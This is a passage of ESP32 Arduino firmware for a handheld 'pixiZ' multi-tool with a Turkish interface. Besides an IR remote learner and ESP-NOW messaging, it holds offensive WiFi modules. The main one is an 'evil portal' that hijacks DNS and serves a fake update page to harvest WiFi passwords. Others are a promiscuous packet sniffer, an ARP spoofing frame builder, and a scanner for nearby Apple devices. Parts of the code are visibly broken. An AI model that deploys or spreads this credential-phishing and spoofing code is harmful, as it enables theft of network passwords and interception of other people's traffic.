  tft.print("WiFi aglari taniyor...");
  ftr("MENU=Iptal");
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
  int n = WiFi.scanNetworks();
  tft.fillScreen(ST77XX_BLACK);
  hdr("BEACON SNIFF", ST77XX_CYAN);
  if (n == 0) {
    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 50);
    tft.print("Ag bulunamadi."); ftr("MENU=Geri"); return;
  }
  if (n > 5) n = 5;
  for (int i = 0; i < n; i++) {
    int y = 24+i*19;
    String enc;
    switch (WiFi.encryptionType(i)) {
      case 2: enc="WPA"; break; case 4: enc="WPA2"; break;
      case 5: enc="WEP"; break; case 7: enc="WPA3"; break;
      case 8: enc="OWE"; break; default: enc="Acik";
    }
    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(4, y+2); tft.print(WiFi.SSID(i).substring(0,12));
    tft.setCursor(96, y+2); tft.setTextColor(ST77XX_GREEN);
    tft.printf("%d%%", constrain(100+WiFi.RSSI(i)*2,0,100));
    tft.setCursor(132, y+2); tft.setTextColor(ST77XX_GREY);
    tft.print(enc);
    tft.setTextColor(ST77XX_GREY);
    tft.setCursor(4, y+10); tft.print(WiFi.BSSIDstr(i).substring(0,8));
    tft.print(" Ch");
    tft.print(WiFi.channel(i));
  }
  WiFi.scanDelete();
  ftr("MENU=Geri");
}

// ═══════════════════════════════════════════════════
//  RAW SNIFFER (802.11 Packet Monitor)
// ═══════════════════════════════════════════════════

void drawRawSniff() {
  pg = 40; hdr("RAW SNIFFER", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 24);
  tft.print("Durum: ");
  tft.setTextColor(rawSniffRunning ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(rawSniffRunning ? "IZLIYOR" : "KAPALI");
  int y = 40;
  for (int i = 0; i < 5; i++) {
    int idx = (rawBufIdx - 1 - i + 10) % 10;
    if (i >= rawBufIdx && rawBufIdx < 10) continue;
    RawPkt* p = &rawBuf[idx];
    if (p->type == 0) continue;
    const char* tn = "?";
    if (p->type==0x80) tn="Beacon";
    else if (p->type==0xC0||p->type==0xA0) tn="Deauth";
    else if (p->type==0x40) tn="ProbeR";
    else if (p->type==0x48) tn="Data";
    tft.setTextColor(ST77XX_GREY); tft.setCursor(4, y);
    tft.printf("[%s]", tn);
    tft.setTextColor(ST77XX_WHITE); tft.print(p->src);
    y += 10;
  }
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void toggleRawSniff() {
  rawSniffRunning = !rawSniffRunning;
  if (rawSniffRunning) {
    memset(rawBuf, 0, sizeof(rawBuf)); rawBufIdx = 0;
    WiFi.mode(WIFI_AP);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_callback(&wifiSniffCallback);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  } else {
    esp_wifi_set_promiscuous(false);
  }
  drawRawSniff();
}

// ═══════════════════════════════════════════════════
//  EVIL PORTAL (HTTP Captive Portal + DNS)
// ═══════════════════════════════════════════════════

const char portalHTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name=viewport content=width=320>
<title>WiFi Update</title><style>body{font-family:sans-serif;background:#f0f0f0;margin:0;padding:20px;text-align:center}h1{color:#333;font-size:18px}.card{background:#fff;border-radius:8px;padding:20px;margin:20px 0;box-shadow:0 2px 8px rgba(0,0,0,.1)}input{width:90%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:14px}button{background:#007aff;color:#fff;border:none;padding:12px 40px;border-radius:4px;font-size:16px;cursor:pointer}.err{color:red;font-size:12px}
</style></head><body><div class=card><h1>WiFi Guncellemesi Gerekli</h1><p style=color:#666;font-size:13px>Baglanti kalitesini artirmak icin lutfen WiFi sifrenizi girin.</p><form action=/ method=post><input type=password name=p placeholder="WiFi Sifresi" required><br><button type=submit>Gonder</button></form></div></body></html>
)rawliteral";

const char portalSuccess[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name=viewport content=width=320><title>Tebrikler</title>
<style>body{font-family:sans-serif;background:#f0f0f0;padding:40px;text-align:center}.card{background:#fff;border-radius:8px;padding:20px}h1{color:#28a745;font-size:18px}</style></head>
<body><div class=card><h1>✔ Basarili!</h1><p>Sifreniz dogrulaniyor...</p></div></body></html>
)rawliteral";

void handlePortalRoot() {
  if (portalServer->hasArg("p")) {
    String p = portalServer->arg("p");
    if (portalCredN < 5) {
      snprintf(portalCreds[portalCredN], 64, "Sifre: %s", p.c_str());
      portalCredN++;
    }
    portalServer->send(200, "text/html", portalSuccess);
  } else {
    portalServer->send(200, "text/html", portalHTML);
  }
}

void handlePortalDNS() {
  int ps = dnsServer->parsePacket();
  if (ps) {
    uint8_t buf[256];
    int l = dnsServer->read(buf, 256);
    if (l > 12 && buf[2] == 0x01) {
      buf[2] = 0x81; buf[3] = 0x80; // response flags
      buf[6] = 0x00; buf[7] = 0x01; // 1 answer
      // Answer: name pointer, type A, class IN, TTL 60, IP length 4
      int ql = 12;
      while (ql < l && buf[ql] != 0) ql++;
      ql += 5;
      buf[ql++] = 0xC0; buf[ql++] = 0x0C; // pointer to name
      buf[ql++] = 0x00; buf[ql++] = 0x01; // type A
      buf[ql++] = 0x00; buf[ql++] = 0x01; // class IN
      buf[ql++] = 0x00; buf[ql++] = 0x00; buf[ql++] = 0x00; buf[ql++] = 0x3C; // TTL 60
      buf[ql++] = 0x00; buf[ql++] = 0x04; // data length 4
      buf[ql++] = portalIP[0]; buf[ql++] = portalIP[1];
      buf[ql++] = portalIP[2]; buf[ql++] = portalIP[3];
      dnsServer->beginPacket(dnsServer->remoteIP(), dnsServer->remotePort());
      dnsServer->write(buf, ql);
      dnsServer->endPacket();
    }
  }
}

void startEvilPortal(const char* ssid) {
  strncpy(portalSSID, ssid, 32); portalSSID[32]=0;
  // Stop any active features
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(portalIP, portalIP, IPAddress(255,255,255,0));
  WiFi.softAP(portalSSID, NULL, 1, 0, 1);
  delay(500);

  // Start DNS server
  if (!dnsServer) dnsServer = new WiFiUDP();
  dnsServer->begin(53);
  portalTimer = millis();

  // Start HTTP server
  if (!portalServer) portalServer = new WebServer(80);
  portalServer->on("/", handlePortalRoot);
  portalServer->begin();

  portalRunning = true;
  portalCredN = 0;
}

void stopEvilPortal() {
  if (portalServer) { portalServer->stop(); delete portalServer; portalServer = NULL; }
  if (dnsServer) { delete dnsServer; dnsServer = NULL; }
  if (dnsServer) dnsServer->stop();
  WiFi.softAPdisconnect(true);
  portalRunning = false;
}

void drawEvilPortal() {
  pg = 41; hdr("EVIL PORTAL", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 24);
  tft.print("SSID: ");
  tft.setTextColor(ST77XX_WHITE); tft.print(portalSSID);
  tft.setCursor(8, 40); tft.setTextColor(ST77XX_CYAN);
  tft.print("IP: ");
  tft.setTextColor(ST77XX_WHITE); tft.print(portalIP.toString());
  tft.setCursor(8, 56); tft.setTextColor(ST77XX_GREEN);
  tft.printf("Yakalanan: %d", portalCredN);
  for (int i = 0; i < portalCredN && i < 2; i++) {
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 70+i*12);
    tft.print(portalCreds[i]);
  }
  if (portalCredN > 2) {
    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 94);
    tft.printf("+%d daha", portalCredN-2);
  }
  tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 108);
  tft.print("Baglan -> sifre gir -> yakala");
  ftr("OK=Baslat/Durdur  MENU=Cikis");
}

void actEvilPortal() {
  if (menu()) { stopEvilPortal(); pg=12; drawHackMenu(); }
  else if (ok()) {
    if (!portalRunning) {
      if (strlen(portalSSID) == 0) strcpy(portalSSID, "FreeWiFi");
      startEvilPortal(portalSSID);
    } else {
      stopEvilPortal();
    }
    drawEvilPortal();
  }
}

// ═══════════════════════════════════════════════════
//  AIRTAG SNIFF (BLE Apple FindMy)
// ═══════════════════════════════════════════════════

void drawAirTagSniff() {
  pg = 43; hdr("AIRTAG SNIFF", ST77XX_MAGENTA);
  if (!airtagRunning) {
    tft.setTextColor(ST77XX_YELLOW); tft.setCursor(8, 40);
    tft.print("Apple AirTag/BLE cihaz");
    tft.setCursor(8, 56); tft.print("taramasi baslat?");
    tft.setCursor(8, 72); tft.print("Cevredeki tum Apple");
    tft.setCursor(8, 86); tft.print("cihazlari listeler.");
    ftr("OK=Baslat  MENU=Cikis"); return;
  }
  tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 24);
  tft.printf("Bulunan: %d", airtagCount);
  for (int i = 0; i < airtagCount && i < 4; i++) {
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 40+i*12);
    tft.print(airtagDevices[i]);
  }
  ftr("OK=Durdur  MENU=Cikis");
}

void startAirTagSniff() {
  airtagRunning = true;
  airtagCount = 0;
  NimBLEDevice::getScan();
  s->setActiveScan(false);
  s->setInterval(100);
  s->setWindow(50);
  BLEScanResults r = s->start(3, false);
  airtagCount = 0;
  for (int i = 0; i < r.getCount() && airtagCount < 10; i++) {
    NimBLEAdvertisedDevice* d = new NimBLEAdvertisedDevice(r.getDevice(i));
    // Apple manufacturer ID = 0x004C
    if (d->haveManufacturerData()) {
      std::string m = d->getManufacturerData();
      if (m.length() >= 2 && (uint8_t)m[0] == 0x4C && (uint8_t)m[1] == 0x00) {
        strncpy(airtagDevices[airtagCount], d->getAddress().toString().c_str(), 17);
        airtagDevices[airtagCount][17]=0;
        airtagCount++;
      }
    }
    delete d;
  }
  airtagRunning = false;
  drawAirTagSniff();
}

// ═══════════════════════════════════════════════════
//  ESP-NOW MESSAGING
// ═══════════════════════════════════════════════════

#if ENABLE_ESPNOW
uint8_t espnowBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

void espnowSendCb(uint8_t* mac, uint8_t status) {}
void espnowRecvCb(const uint8_t* mac, const uint8_t* data, int len) {
  if (espnowRecvN < 5 && len < 64) {
    snprintf(espnowRecv[espnowRecvN], 64, "%02X:%02X:%02X:%02X:%02X:%02X > %s",
             mac[0],mac[1],mac[2],mac[3],mac[4],mac[5], (char*)data);
    espnowRecvN++;
  }
}

void initESPNOW() {
  if (espnowInit) return;
  WiFi.mode(WIFI_STA);
  if (esp_now_init() == ESP_OK) {
    esp_now_register_send_cb(espnowSendCb);
    esp_now_register_recv_cb(espnowRecvCb);
    esp_now_peer_info_t peer = {};
    peer.channel = 0;
    peer.ifidx = WIFI_IF_STA;
    peer.encrypt = false;
    memcpy(peer.peer_addr, espnowBroadcast, 6);
    esp_now_add_peer(&peer);
    espnowInit = true;
  }
}

void drawESPNOW() {
  pg = 44; hdr("ESP-NOW", ST77XX_YELLOW);
  if (!espnowInit) initESPNOW();
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 24);
  tft.print("ESP-NOW Mesajlasma");
  tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 40);
  tft.print("MAC: ");
  tft.setTextColor(ST77XX_GREEN);
  tft.print(WiFi.macAddress());
  tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 58);
  tft.print("Son mesajlar:");
  for (int i = 0; i < espnowRecvN && i < 3; i++) {
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 72+i*10);
    tft.print(espnowRecv[i]);
  }
  ftr("OK=Gonder  MENU=Geri");
}

void drawESPNOWMsg() {
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0,0,160,20,ST77XX_YELLOW);
  tft.drawFastHLine(0,20,160,0x3A9F);
  tft.setTextSize(1); tft.setTextColor(ST77XX_BLACK);
  tft.setCursor(8,5); tft.print("MESAJ GONDER");
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(8,30); tft.print("Mesaj: ");
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(8,46); tft.print(espnowMsg);
  ftr("UP=Karakter  OK=Gonder  MENU=Iptal");
  pg = 45;
}

void actESPNOW() {
  if (pg == 44) {
    if (menu()) { pg=0; drawMain(); }
    else if (ok()) { drawESPNOWMsg(); }
  } else if (pg == 45) {
    if (menu()) { pg=44; drawESPNOW(); }
    else if (ok()) {
      if (strlen(espnowMsg) > 0) {
        esp_now_send(espnowBroadcast, (uint8_t*)espnowMsg, strlen(espnowMsg)+1);
        tft.fillRect(0,70,160,30,ST77XX_BLACK);
        tft.setTextColor(ST77XX_GREEN); tft.setCursor(8,76);
        tft.print("Gonderildi!"); delay(600);
        memset(espnowMsg, 0, sizeof(espnowMsg));
        drawESPNOW();
      }
    }
    else if (up()) {
      int l = strlen(espnowMsg);
      if (l < 63) { espnowMsg[l] = 'A' + (esp_random()%26); espnowMsg[l+1]=0; }
      else if (l == 63) { espnowMsg[l] = 'a' + (esp_random()%26); espnowMsg[l+1]=0; }
      drawESPNOWMsg();
    }
    else if (down() && strlen(espnowMsg) > 0) {
      espnowMsg[strlen(espnowMsg)-1] = 0;
      drawESPNOWMsg();
    }
  }
}
#else
void drawESPNOW() { pg=44; hdr("ESP-NOW", ST77XX_YELLOW);
  tft.setTextColor(ST77XX_GREY); tft.setCursor(8,40);
  tft.print("ESP-NOW devre disi."); ftr("MENU=Geri"); }
void actESPNOW() { if (menu()) { pg=12; drawHackMenu(); } }
#endif

// ═══════════════════════════════════════════════════
//  ARP SPOOFING
// ═══════════════════════════════════════════════════

void drawARPSpoof() {
  pg = 46; hdr("ARP SPOOFING", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 24);
  tft.print("Durum: ");
  tft.setTextColor(arpRunning ? ST77XX_GREEN : ST77XX_YELLOW);
  tft.print(arpRunning ? "ZEHIRLIYOR" : "KAPALI");
  tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 42);
  tft.printf("Gonderilen: %d", arpSent);
  tft.setCursor(8, 58); tft.setTextColor(ST77XX_GREY);
  tft.print("Hedef: "); tft.setTextColor(ST77XX_WHITE);
  tft.printf("%d.%d.%d.%d", arpTargetIP[0],arpTargetIP[1],arpTargetIP[2],arpTargetIP[3]);
  tft.setCursor(8, 74); tft.setTextColor(ST77XX_GREY);
  tft.print("Sag MAC: "); tft.setTextColor(ST77XX_WHITE);
  tft.print(arpFakeMAC);
  tft.setCursor(8, 92); tft.setTextColor(ST77XX_GREY);
  tft.print("HTTP'ye yonlendirir.");
  ftr("OK=Ac/Kapat  MENU=Cikis");
}

void sendArpReply(uint8_t* targetIP, uint8_t* fakeMAC) {
  // Simple ARP reply via raw frame
  uint8_t pkt[42] = {0};
  // Ethernet header (pseudo for WiFi)
  pkt[0]=0xFF; pkt[1]=0xFF; pkt[2]=0xFF; pkt[3]=0xFF; pkt[4]=0xFF; pkt[5]=0xFF; // DA broadcast
  memcpy(pkt+6, fakeMAC, 6); // SA = fake MAC
  pkt[12]=0x08; pkt[13]=0x06; // ARP
  // ARP header
  pkt[14]=0x00; pkt[15]=0x01; // hardware type Ethernet
  pkt[16]=0x08; pkt[17]=0x00; // protocol type IP
  pkt[18]=6; pkt[19]=4; // hlen=6, plen=4
  pkt[20]=0x00; pkt[21]=0x02; // ARP reply
  memcpy(pkt+22, fakeMAC, 6);
  memcpy(pkt+28, targetIP, 4);
  // Sender (who we're spoofing - gateway)
  uint8_t gw[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
  memcpy(pkt+32, gw, 6);
  memcpy(pkt+38, targetIP, 4);

  esp_wifi_80211_tx(WIFI_IF_AP, pkt, 42, false);
}

void toggleARPSpoof() {
  arpRunning = !arpRunning;
  if (arpRunning) {
    WiFi.mode(WIFI_AP);
    esp_wifi_set_promiscuous(true);
    arpSent = 0;
  } else {
    esp_wifi_set_promiscuous(false);
  }
  drawARPSpoof();
}

// ═══════════════════════════════════════════════════
//  SPLASH + SETUP
// ═══════════════════════════════════════════════════

void splash() {
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRoundRect(20, 16, 120, 96, 8, ST77XX_BLUE);
  tft.setTextSize(2); tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(32, 30); tft.print("pixiZ");
  tft.setTextSize(1); tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(28, 56); tft.print("Multi-Tool");
  tft.setCursor(24, 72); tft.print("Remote v5");
  tft.setTextColor(ST77XX_GREY);
  tft.setCursor(12, 100); tft.print("ESP32 DevKit V4");
}

void setup() {
  Serial.begin(115200);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_MENU, INPUT_PULLUP);

  tft.initR(INITR_BLACKTAB);
  tft.setRotation(1);
  tft.fillScreen(ST77XX_BLACK);

  IrReceiver.begin(IR_RECV, ENABLE_LED_FEEDBACK);
  IrSender.begin(IR_SEND);
  stInit();
  ldIR();
#if ENABLE_BADUSB
  ldPayloads();
#endif
#if ENABLE_PASS
  ldPass();
#endif
#if ENABLE_BT
  bleKeyboard.begin();
#endif
#if ENABLE_ESPNOW
  initESPNOW();
#endif

  NimBLEDevice::init("pixiZ");
  splash(); delay(1500);
  pg = 0; sel = 0;
  // Default port scan target to gateway
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
  IPAddress gw = WiFi.gatewayIP();
  if (gw) { portScanTarget[0]=gw[0]; portScanTarget[1]=gw[1]; portScanTarget[2]=gw[2]; portScanTarget[3]=gw[3]; }
  else { portScanTarget[0]=192; portScanTarget[1]=168; portScanTarget[2]=1; portScanTarget[3]=1; }
  WiFi.mode(WIFI_OFF);
  drawMain();
}

// ═══════════════════════════════════════════════════
//  MAIN MENU
// ═══════════════════════════════════════════════════

const char* mn[] = {
  "IR Remote",
  "IR Tools",
#if ENABLE_BT
  "Bluetooth KB",
#endif
#if ENABLE_HACK
  "Hack Tools",
#endif
#if ENABLE_BLESPAM || ENABLE_BLESCAN
  "BLE Tools",
#endif
  "WiFi Tools",
#if ENABLE_BADUSB
  "BadUSB",
#endif
#if ENABLE_ESPNOW
  "ESP-NOW",
#endif
#if ENABLE_PASS
  "Passwords",
#endif
  "Tools"
};
const int MNC = sizeof(mn)/sizeof(mn[0]);

void drawMain() {
  pg = 0; hdr("pixiZ v5", ST77XX_BLUE);
  for (int i = 0; i < MNC; i++) mi(i, MNC, 28, 28, ST77XX_CYAN, sel, mn[i]);
  ftr("UP/DOWN  OK=Sel  MENU=Tools");
}

void mainUp() { int o=sel; sel=(sel-1+MNC)%MNC; mi(o,MNC,28,28,ST77XX_CYAN,sel,mn[o]); mi(sel,MNC,28,28,ST77XX_CYAN,sel,mn[sel]); }
void mainDown() { int o=sel; sel=(sel+1)%MNC; mi(o,MNC,28,28,ST77XX_CYAN,sel,mn[o]); mi(sel,MNC,28,28,ST77XX_CYAN,sel,mn[sel]); }
void mainOk() {
  int i=0;
  if (sel==i) { sel2=0; pg=1; drawIRList(); return; }
  if (sel==++i) { sel2=0; pg=30; drawIRToolsMenu(); return; }
#if ENABLE_BT
  if (sel==++i) { pg=5; drawBT(); return; }
#endif
#if ENABLE_HACK
  if (sel==++i) { sel2=0; pg=12; drawHackMenu(); return; }
#endif
#if ENABLE_BLESPAM || ENABLE_BLESCAN
  if (sel==++i) { sel2=0; pg=22; drawBLEMenu(); return; }
#endif
  if (sel==++i) { wifiSel=0; pg=6; drawWiFi(); return; }
#if ENABLE_BADUSB
  if (sel==++i) { sel2=0; pg=33; drawBadUSBMenu(); return; }
#endif
#if ENABLE_ESPNOW
  if (sel==++i) { pg=44; drawESPNOW(); return; }
#endif
#if ENABLE_PASS
  if (sel==++i) { sel2=0; pg=8; drawPassList(); return; }
#endif
  if (sel==++i) { sel3=0; pg=10; drawTools(); }
}

// ═══════════════════════════════════════════════════
//  IR MODULE (mevcut)
// ═══════════════════════════════════════════════════

void drawIRList() {
  pg=1; hdr("IR REMOTES", ST77XX_GREEN);
  if (rmtN == 0) {
    tft.setTextColor(ST77XX_GREY);
    tft.setCursor(20, 50); tft.print("No remotes yet");
    tft.setCursor(8, 66); tft.print("OK to add new");
    ftr("OK=Add  MENU=Back"); return;
  }
  for (int i = 0; i < rmtN && i < 5; i++) {
    int y = 24+i*19;
    bool s = i==sel2;
    tft.fillRect(2, y, 156, 17, s ? ST77XX_GREEN : ST77XX_BLACK);
    if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_GREEN);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
    tft.setCursor(8, y+4); tft.print(rmt[i].name);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_GREY);
    tft.setCursor(124, y+4); tft.print(rmt[i].bc);
  }
  ftr("OK=Open  MENU=Back");
}
void drawIRItem(int idx, bool s) {
  int y = 24+idx*19;
  tft.fillRect(2, y, 156, 17, s ? ST77XX_GREEN : ST77XX_BLACK);
  if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_GREEN);
  tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
  tft.setCursor(8, y+4); tft.print(rmt[idx].name);
  tft.setTextColor(s ? ST77XX_BLACK : ST77XX_GREY);
  tft.setCursor(124, y+4); tft.print(rmt[idx].bc);
}
void drawBtnList() {
  pg=2; hdr(rmt[sel2].name, ST77XX_GREEN);
  int c = rmt[sel2].bc, t = c + (c < MAX_BTNS ? 1 : 0);
  if (c == 0) {
    tft.setTextColor(ST77XX_GREY);
    tft.setCursor(12, 50); tft.print("No buttons yet");
    tft.setCursor(12, 66); tft.print("OK to learn");
    ftr("OK=Learn  MENU=Back"); return;
  }
  for (int i = 0; i < t && i < 5; i++) {
    int y = 24+i*19; bool s = i==sel3;
    tft.fillRect(2, y, 156, 17, s ? ST77XX_CYAN : ST77XX_BLACK);
    if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_CYAN);
    tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
    if (i < c) { tft.setCursor(8, y+4); tft.print(rmt[sel2].btns[i].name); }
    else { tft.setTextColor(s ? ST77XX_BLACK : ST77XX_GREEN); tft.setCursor(8, y+4); tft.print("+ Add"); }
  }
  ftr("OK=Send/Add  MENU=Back");
}
void drawBtnItem(int idx, bool s) {
  int c = rmt[sel2].bc, y = 24+idx*19;
  tft.fillRect(2, y, 156, 17, s ? ST77XX_CYAN : ST77XX_BLACK);
  if (s) tft.drawRoundRect(2, y, 156, 17, 3, ST77XX_CYAN);
  tft.setTextColor(s ? ST77XX_BLACK : ST77XX_WHITE);
  if (idx < c) { tft.setCursor(8, y+4); tft.print(rmt[sel2].btns[idx].name); }
  else { tft.setTextColor(s ? ST77XX_BLACK : ST77XX_GREEN); tft.setCursor(8, y+4); tft.print("+ Add"); }
}
void drawLearn() {
  pg=3; hdr("LEARN IR", ST77XX_RED);
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 30);
  tft.print("Remote: "); tft.setTextColor(ST77XX_WHITE); tft.print(rmt[lrnRmt].name);
  tft.drawFastHLine(8, 46, 144, ST77XX_GREY);
  if (lrnSt == 0) {
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(8, 56); tft.print("Point & press a");
    tft.setCursor(8, 70); tft.print("button on remote");
    tft.setTextColor(ST77XX_GREY); tft.setCursor(8, 90); tft.print("Button: ");
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 104); tft.print(tName);
    tft.fillRoundRect(44, 98, 72, 16, 3, ST77XX_RED);
    tft.setTextColor(ST77XX_WHITE); tft.setCursor(60, 102); tft.print("WAITING");
  } else {
    tft.setTextColor(ST77XX_GREEN);
    tft.setCursor(8, 56); tft.print("Signal received!");
    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(8, 72); tft.print("Proto: ");
    switch (irRes.protocol) {
      case NEC: tft.print("NEC"); break;
      case SONY: tft.print("SONY"); break;
      case RC5: tft.print("RC5"); break;
      case RC6: tft.print("RC6"); break;
      case SAMSUNG: tft.print("SAMSUNG"); break;
      default: tft.print((int)irRes.protocol);
    }
    tft.setCursor(8, 86); tft.print("Addr:0x"); tft.print(irRes.address, HEX);
    tft.setCursor(8, 100); tft.print("Cmd: 0x"); tft.print(irRes.command, HEX);
  }
  ftr("OK=Learn/Save  MENU=Cancel");
}
void drawSend() {
  pg=4; hdr("SENDING", ST77XX_GREEN);
  IRBtn* b = &rmt[sel2].btns[sel3];
  tft.setTextColor(ST77XX_CYAN); tft.setCursor(8, 40); tft.print("Remote: ");
  tft.setTextColor(ST77XX_WHITE); tft.print(rmt[sel2].name);
  tft.setCursor(8, 56); tft.setTextColor(ST77XX_CYAN); tft.print("Button: ");
  tft.setTextColor(ST77XX_WHITE); tft.print(b->name);
  tft.setTextColor(ST77XX_YELLOW); tft.setCursor(8, 78); tft.print("Sending IR...");
  for (int i = 0; i < 3; i++) { sendIR(b->addr, b->cmd, b->proto); delay(50); }
  tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 96); tft.print("Done!");
  ftr("MENU=Back");
}
void irAdd() {
  if (rmtN >= MAX_REMOTES) return;
  int n = 1;
  while (true) {
    char buf[MAX_NAME]; sprintf(buf, "Kumanda_%d", n);
    bool f = false;
    for (int i = 0; i < rmtN; i++) if (strcmp(rmt[i].name, buf) == 0) { f=true; n++; break; }
    if (!f) {
      strcpy(rmt[rmtN].name, buf); rmt[rmtN].bc = 0;
      rmtN++; svIR(); sel2 = rmtN-1; sel3 = 0;
      lrnRmt = sel2; lrn = true; lrnSt = 0;
      int m = 1;
      while (true) {
        char b2[MAX_BNAME]; sprintf(b2, "Tus_%d", m);
        bool f2 = false;
        for (int i = 0; i < rmt[lrnRmt].bc; i++)
          if (strcmp(rmt[lrnRmt].btns[i].name, b2) == 0) { f2=true; m++; break; }
        if (!f2) { strcpy(tName, b2); break; }
      }
      drawLearn(); return;
    }
  }
}
void irLearn(int rIdx) {
  lrnRmt = rIdx; lrnSt = 0; lrn = true;
  int n = 1;
  while (true) {
    char buf[MAX_BNAME]; sprintf(buf, "Tus_%d", n);
    bool f = false;
    for (int i = 0; i < rmt[rIdx].bc; i++)
      if (strcmp(rmt[rIdx].btns[i].name, buf) == 0) { f=true; n++; break; }
    if (!f) { strcpy(tName, buf); break; }
  }
  drawLearn();
}
void irSave() {
  int r = lrnRmt;
  if (r < 0 || r >= rmtN) return;
  int b = rmt[r].bc;
  if (b >= MAX_BTNS) return;
  strcpy(rmt[r].btns[b].name, tName);
  rmt[r].btns[b].addr = irRes.address;
  rmt[r].btns[b].cmd = irRes.command;
  rmt[r].btns[b].proto = irRes.protocol;
  rmt[r].bc++; svIR(); sel3 = b; lrn = false;
  tft.fillRect(0, 50, 160, 30, ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 64); tft.print("Kaydedildi!");
  delay(600);
}
void IRloop() {
  if (lrn && lrnSt == 0 && IrReceiver.decode()) {
    irRes = IrReceiver.decodedIRData; IrReceiver.resume();
    lrnSt = 1; drawLearn();
  }
  if (irRawMode && irRawSt == 0 && IrReceiver.decode()) {
    irRes = IrReceiver.decodedIRData; IrReceiver.resume();
    irRawSt = 1;
    tft.fillRect(0, 30, 160, 80, ST77XX_BLACK);
    tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 40); tft.print("Sinyal alindi!");
    tft.setCursor(8, 56); tft.print("Proto: ");
    switch (irRes.protocol) {
      case NEC: tft.print("NEC"); break;
      case SONY: tft.print("SONY"); break;
      case RC5: tft.print("RC5"); break;
      case RC6: tft.print("RC6"); break;
      case SAMSUNG: tft.print("SAMSUNG"); break;
      default: tft.print((int)irRes.protocol);
    }
    tft.setCursor(8, 72); tft.print("Addr:0x"); tft.print(irRes.address, HEX);
    tft.setCursor(8, 88); tft.print("Cmd: 0x"); tft.print(irRes.command, HEX);
  }
}

void sendIR(uint16_t addr, uint16_t cmd, uint8_t proto) {
  switch ((decode_type_t)proto) {
    case NEC: IrSender.sendNEC(addr, cmd, 0); break;
    case SONY: IrSender.sendSony(addr, cmd, 12); break;
    case RC5: IrSender.sendRC5(addr, cmd, 0); break;
    case RC6: IrSender.sendRC6(addr, cmd, 0); break;
    case SAMSUNG: IrSender.sendSamsung(addr, cmd, 0); break;
    default: IrSender.sendNEC(addr, cmd, 0); break;
  }
}

void actIR() {
  if (pg == 1) {
    if (rmtN == 0) {
      if (ok()) irAdd();
      else if (menu()) { pg=0; drawMain(); }
      return;
    }
    if (up()) { int o=sel2; sel2=(sel2-1+rmtN)%rmtN; drawIRItem(o,0); drawIRItem(sel2,1); }
    else if (down()) { int o=sel2; sel2=(sel2+1)%rmtN; drawIRItem(o,0); drawIRItem(sel2,1); }
    else if (ok()) { sel3=0; drawBtnList(); }
    else if (menu()) { pg=0; drawMain(); }
    return;
  }
  if (pg == 2) {
    int c = rmt[sel2].bc, t = c + (c < MAX_BTNS ? 1 : 0);
    if (ok()) {
      if (c == 0 || sel3 >= c) { irLearn(sel2); }
      else drawSend();
    } else if (up() && t > 0) { int o=sel3; sel3=(sel3-1+t)%t; drawBtnItem(o,0); drawBtnItem(sel3,1); }
    else if (down() && t > 0) { int o=sel3; sel3=(sel3+1)%t; drawBtnItem(o,0); drawBtnItem(sel3,1); }
    else if (menu()) { pg=1; drawIRList(); }
    return;
  }
  if (pg == 3) {
    if (ok()) { if (lrnSt == 0) drawLearn(); else irSave(); }
    else if (menu()) { lrn=0; lrnSt=0; pg=2; drawBtnList(); }
    return;
  }
  if (pg == 4) {
    if (menu()) { pg=2; drawBtnList(); }
    return;
  }
}

void drawIRRaw() {
  pg=32; hdr("IR RAW CAPTURE", ST77XX_RED);
  tft.setTextColor(ST77XX_YELLOW);
